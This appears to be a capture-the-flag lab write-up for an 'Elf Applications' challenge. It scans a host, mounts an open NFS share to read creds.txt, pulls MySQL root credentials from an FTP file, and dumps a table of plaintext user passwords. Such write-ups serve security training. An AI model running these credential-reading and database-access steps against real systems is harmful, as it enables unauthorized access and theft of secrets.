# Elf Applications

1. What is the password inside the creds.txt file?
   Ans:

   ```bash
   sudo nmap -sT -sC -F 10.49.187.53 -O -sV

   21/tcp   open     ftp     vsftpd 3.0.2
   22/tcp   open     ssh     OpenSSH 7.4 (protocol 2.0)
   2049/tcp open     nfs_acl 3 (RPC #100227)
   3306/tcp open     mysql   MySQL 5.7.28
   6000/tcp filtered X11

   ftp <ip> #didnt get anything

   showmount -e <ip>
   Export list for 10.49.187.53:
   /opt/files \*
   sudo mount 10.49.167.215:/opt/files /mnt
   injustice@omega:/mnt-$ cat creds.txt
   the password is securepassword123
   ```

2. What is the name of the file running on port 21?
   Ans:

   ```bash
   ftp 10.10.125.220
   ls
   get file.txt
   ```

3. What is the password after enumerating the database?
   Ans:

   ```bash
   cat file.txt
   remember to wipe mysql:
   root
   ff912ABD*
   mysql -h 10.10.125.220 -u root -p
   show databases;
   +--------------------+
   | Database           |
   +--------------------+
   | information_schema |
   | data               |
   | mysql              |
   | performance_schema |
   | sys                |
   +--------------------+
   se data
   Reading table information for completion of table and column names
   You can turn off this feature to get a quicker startup with -A
   Database changed
   mysql> show tables;
   +----------------+
   | Tables_in_data |
   +----------------+
   | USERS |
   +----------------+
   select \* from USERS;
   +-------+--------------+
   | name | password |
   +-------+--------------+
   | admin | bestpassword |
   +-------+--------------+
   ```
